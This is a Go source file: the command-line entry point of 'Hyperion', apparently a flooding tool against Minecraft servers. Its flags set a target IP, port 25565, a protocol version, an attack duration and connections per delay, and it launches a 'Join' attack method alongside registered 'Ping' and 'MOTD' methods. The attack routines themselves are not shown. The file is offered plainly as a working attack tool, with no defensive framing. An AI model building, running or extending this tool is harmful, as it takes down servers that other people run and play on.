package main

import (
	"Hyperion/core"
	"Hyperion/core/method"
	"Hyperion/core/method/methods"
	"flag"
	"time"
)

var (
	ip       = flag.String("ip", "0.0.0.0", "sets ip")
	port     = flag.Int("port", 25565, "sets port")
	protocol = flag.Int("protcol", 761, "sets version protocol")
	duration = flag.Int("duration", 600, "duration in sec")
	perDelay = flag.Int("perDelay", 100, "connecion per delay")
	delay    = flag.Int("delay", 0, "delay in sec")
)

func main() {
	flag.Parse()
	registerMethod()
	method := methods.Join{}
	method.Start(core.AttackInfo{
		Ip:       *ip,
		Port:     *port,
		Protocol: *protocol,
		Duration: time.Duration(*duration) * time.Second,
		PerDelay: *perDelay,
		Delay:    time.Duration(*delay),
	})
}

func registerMethod() {
	method.RegisterMethod(methods.Join{})
	method.RegisterMethod(methods.Ping{})
	method.RegisterMethod(methods.MOTD{})
}
